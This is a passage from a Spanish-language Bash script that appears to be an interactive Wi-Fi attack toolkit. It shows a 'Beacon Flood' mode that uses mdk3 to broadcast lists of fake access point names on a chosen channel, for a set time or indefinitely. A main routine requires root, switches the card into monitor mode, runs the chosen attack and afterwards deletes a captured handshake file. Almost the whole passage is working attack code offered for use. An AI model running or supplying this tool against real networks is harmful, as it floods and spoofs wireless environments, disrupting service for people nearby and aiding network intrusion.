						echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						#Inicio de ataque
						mdk3 $inter b -f $file -a -s 1000 &
						sleep 2
						BFPID=$!
						mapfile -t redes < $file
						linesF=$(cat $file | wc -l) > /dev/null 2>&1
##						echo $linesF
						i=0
						while true; do
							clear
							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							i=$((i+1))
							if [[ $i == $linesF ]]; then
								i=0
							fi
					  done
					fi
				else
					echo -e "\t ${rC}[!]${endC} ${bC}El archivo no tiene contenido${endC}"
					echo -e "\t ${rC}[!]${endC} ${bC}Se usara un archivo con redes pre-cargadas ...${endC}"

					echo -ne "\n${yC} [*]${endC}${grC} Ingrese el canal en que operara el ataque[0-14]: ${endC}" && read ch
					if [[ $ch =~ ^-?[0-9]+$ ]]; then
						#validar que este entre 0 y 14
						if (($ch >= 0 && $ch <= 14)); then
							true
						else
						#setear un valor en dado caso que se salga de los canales existentes
							echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
							ch=1
							echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
							sleep 2
						fi
					else
					#setear un valor en dado caso que se salga de los canales existentes
						echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
						ch=1
						echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
						sleep 2
					fi
					echo -ne "\n${yC} [*]${endC}${grC} Ingrese el tiempo que durara el ataque[i=indefinido]: ${endC}" && read tm

					if [[ $tm =~ ^-?[0-9]+$ ]]; then

						echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						mdk3 $inter b -f $dicR -a -s 1000 &
						BFPID=$!
						mapfile -t redes < $dicR
						for i in $(seq $tm); do
								clear
								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
						done
						kill -9 $BFPID; wait $BFPID 2>/dev/null
						echo -e "\n${rC} [!]${endC}${bC} Ataque Beacon Flood finalizado...${endC}"
						sleep 1
						echo -e "\n${rC} [!] ${endC}${grC}Saliendo ....${endC}"
						sleep 1
						exit 0

					elif [ $tm == 'i' ]; then
						echo -e "${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						mdk3 $inter b -f $dicR -a -s 1000 &
						BFPID=$!
						mapfile -t redes < $dicR
						linesF=$(cat $file | wc -l) > /dev/null 2>&1
						i=0
						while true; do
							clear
							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							i=$((i+1))
							if [[ $i == $linesF ]]; then
								i=0
							fi
						done
					else
					#alerta de que no es valido el tiempo y conteo para iniciar el ataque en tiempo infefinido
						for i in $(seq 6); do
							clear
							echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida .${endC}"
							echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido .${endC}"
							echo -e "\n ${bC} [-]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${bC} [!] $tm${endC}${grC} Opcion invalida ..${endC}"
							echo -e "\n ${rC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ..${endC}"
							echo -e "\n ${yC} [/]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${yC} [!] $tm${endC}${grC} Opcion invalida ...${endC}"
							echo -e "\n ${bC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ...${endC}"
							echo -e "\n ${rC} [|]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida ....${endC}"
							echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ....${endC}"
							echo -e "\n ${bC} [\]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
						done
						tm=i
						echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						#Inicio de ataque
						mdk3 $inter b -f $dicR -a -s 1000 &
						BFPID=$!
						mapfile -t redes < $dicR
						linesF=$(cat $file | wc -l) > /dev/null 2>&1
##						echo $linesF
						i=0
						while true; do
							clear
							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							i=$((i+1))
							if [[ $i == $linesF ]]; then
								i=0
							fi
					  done
					fi
				fi
			else
					echo -e "\n\t ${rC}[!]${endC} ${yC}No exite el archivo${endC}"
					echo -e "\n\t ${r}[!]${endC} ${grC}Se usara un archivo con redes pre-cargadas ...${endC}"

					echo -ne "\n${yC} [*]${endC}${grC} Ingrese el canal en que operara el ataque[0-14]: ${endC}" && read ch
					if [[ $ch =~ ^-?[0-9]+$ ]]; then
						#validar que este entre 0 y 14
						if (($ch >= 0 && $ch <= 14)); then
							true
						else
						#setear un valor en dado caso que se salga de los canales existentes
							echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
							ch=1
							echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
							sleep 2
						fi
					else
					#setear un valor en dado caso que se salga de los canales existentes
						echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
						ch=1
						echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
						sleep 2
					fi
					echo -ne "\n${yC} [*]${endC}${grC} Ingrese el tiempo que durara el ataque[i=indefinido]: ${endC}" && read tm

					if [[ $tm =~ ^-?[0-9]+$ ]]; then

						echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						mdk3 $inter b -f $dicR -a -s 1000 &
						BFPID=$!
						mapfile -t redes < $dicR
						for i in $(seq $tm); do
								clear
								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
								sleep .25
						done
						kill -9 $BFPID; wait $BFPID 2>/dev/null
						echo -e "\n${rC} [!]${endC}${bC} Ataque Beacon Flood finalizado...${endC}"
						sleep 1
						echo -e "\n${rC} [!] ${endC}${grC}Saliendo ....${endC}"
						sleep 1
						exit 0

					elif [ $tm == 'i' ]; then
						echo -e "${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						mdk3 $inter b -f $dicR -a -s 1000 &
						BFPID=$!
						mapfile -t redes < $dicR
						linesF=$(cat $file | wc -l) > /dev/null 2>&1
						i=0
						while true; do
							clear
							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							i=$((i+1))
							if [[ $i == $linesF ]]; then
								i=0
							fi
						done
					else
					#alerta de que no es valido el tiempo y conteo para iniciar el ataque en tiempo infefinido
						for i in $(seq 6); do
							clear
							echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida .${endC}"
							echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido .${endC}"
							echo -e "\n ${bC} [-]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${bC} [!] $tm${endC}${grC} Opcion invalida ..${endC}"
							echo -e "\n ${rC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ..${endC}"
							echo -e "\n ${yC} [/]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${yC} [!] $tm${endC}${grC} Opcion invalida ...${endC}"
							echo -e "\n ${bC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ...${endC}"
							echo -e "\n ${rC} [|]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida ....${endC}"
							echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ....${endC}"
							echo -e "\n ${bC} [\]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
						done
						tm=i
						echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						#Inicio de ataque
						mdk3 $inter b -f $dicR -a -s 1000 &
						BFPID=$!
						mapfile -t redes < $dicR
						linesF=$(cat $file | wc -l) > /dev/null 2>&1
##						echo $linesF
						i=0
						while true; do
							clear
							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							i=$((i+1))
							if [[ $i == $linesF ]]; then
								i=0
							fi
						done
					fi
				fi
		else
			#conf por si no tiene archivo

			echo -ne "\n${yC} [*]${endC}${grC} Ingrese el canal en que operara el ataque[0-14]: ${endC}" && read ch
			if [[ $ch =~ ^-?[0-9]+$ ]]; then
				#validar que este entre 0 y 14
				if (($ch >= 0 && $ch <= 14)); then
					true
				else
				#setear un valor en dado caso que se salga de los canales existentes
					echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
					ch=1
					echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
					sleep 2
				fi
			else
			#setear un valor en dado caso que se salga de los canales existentes
				echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
				ch=1
				echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
				sleep 2
			fi
			echo -ne "\n${yC} [*]${endC}${grC} Ingrese el tiempo que durara el ataque[i=indefinido]: ${endC}" && read tm

			if [[ $tm =~ ^-?[0-9]+$ ]]; then

				echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
				mdk3 $inter b -f $dicR -a -s 1000 &
				BFPID=$!
				mapfile -t redes < $dicR
				linesF=$(cat $dicR | wc -l) > /dev/null 2>&1
				bi=0
				for i in $(seq $tm); do
						clear
						echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
						sleep .25
						clear
						echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
						sleep .25
						clear
						echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
						sleep .25
						clear
						echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
						sleep .25
						bi=$((bi+1))
						if [[ $bi == $linesF ]]; then
							bi=0
						fi
				done
				kill -9 $BFPID; wait $BFPID 2>/dev/null
				echo -e "\n${rC} [!]${endC}${bC} Ataque Beacon Flood finalizado...${endC}"
				sleep 1
				echo -e "\n${rC} [!] ${endC}${grC}Saliendo ....${endC}"
				sleep 1
				exit 0

			elif [ $tm == 'i' ]; then
				echo -e " ${yC}\n [*] ${endC}${bC} Iniciando ataque Beacon Flood ...${endC}"
				mdk3 $inter b -f $dicR -a -s 1000 &
				BFPID=$!
				mapfile -t redes < $dicR
				linesF=$(cat $dicR | wc -l) > /dev/null 2>&1
				i=0
				while true; do
					clear
					echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					clear
					echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					clear
					echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					clear
					echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					i=$((i+1))
					if [[ $i == $linesF ]]; then
						i=0
					fi
				done
			else
			#alerta de que no es valido el tiempo y conteo para iniciar el ataque en tiempo infefinido
				for i in $(seq 6); do
					clear
					echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida .${endC}"
					echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido .${endC}"
					echo -e "\n ${bC} [-]${endC}${grC} Iniciando en: $i seg.${endC}"
					sleep .25
					clear
					echo -e "\n ${bC} [!] $tm${endC}${grC} Opcion invalida ..${endC}"
					echo -e "\n ${rC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ..${endC}"
					echo -e "\n ${yC} [/]${endC}${grC} Iniciando en: $i seg.${endC}"
					sleep .25
					clear
					echo -e "\n ${yC} [!] $tm${endC}${grC} Opcion invalida ...${endC}"
					echo -e "\n ${bC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ...${endC}"
					echo -e "\n ${rC} [|]${endC}${grC} Iniciando en: $i seg.${endC}"
					sleep .25
					clear
					echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida ....${endC}"
					echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ....${endC}"
					echo -e "\n ${bC} [\]${endC}${grC} Iniciando en: $i seg.${endC}"
					sleep .25
				done
				tm=i
				echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
				#Inicio de ataque
				mdk3 $inter b -f $dicR -a -s 1000 &
				sleep 2
				BFPID=$!
				mapfile -t redes < $dicR
				linesF=$(cat $dicR | wc -l) > /dev/null 2>&1
##						echo $linesF
				i=0
				while true; do
					clear
					echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					clear
					echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					clear
					echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					clear
					echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
					sleep .25
					i=$((i+1))
					if [[ $i == $linesF ]]; then
						i=0
					fi
				done
			fi
		fi
	else
		echo " No exite ese ataque ..."
	fi
}


#Main

if [ "$(/usr/bin/id -u)" == "0" ]; then
	banner
	declare -i noCheck=0;declare -i help=0;declare -i parameter_c=0
	while getopts ":a:dn:h" arg; do
		case $arg in
			a)attackMode=$OPTARG; let parameter_c+=1;;
			n)networkCard=$OPTARG; let parameter_c+=1;;
			d)noCheck=1;;
			h)help=1;;
			\?)no=$OPTARG; echo -e "\n${rC}[!]${endC} ${rC}-$no${end} ${grC}es un argumento no valido.${endC}" >&2; tput cnorm;exit 0
		esac
	done
	if [ $parameter_c -ne 2 ]; then
		if [[ $help == 1 ]]; then
			help
		else
			help
		fi
	else
		if [ $noCheck == 1 ]; then
			monitor
			startA
			tput cnorm; airmon-ng stop $inter > /dev/null 2>&1; rm int > /dev/null 2>&1; rm files/handshake-01.cap > /dev/null 2>&1; service networking restart
		else
			dependencias
			monitor
			startA
			tput cnorm; airmon-ng stop $inter > /dev/null 2>&1; rm int > /dev/null 2>&1; rm files/handshake-01.cap > /dev/null 2>&1; service networking restart
		fi
	fi
else
	banner
	echo -e "${yC}\n [!]${endC}${rC} Se necesitan persimos root para ejecutar el programa.${endC}"
	help
fi
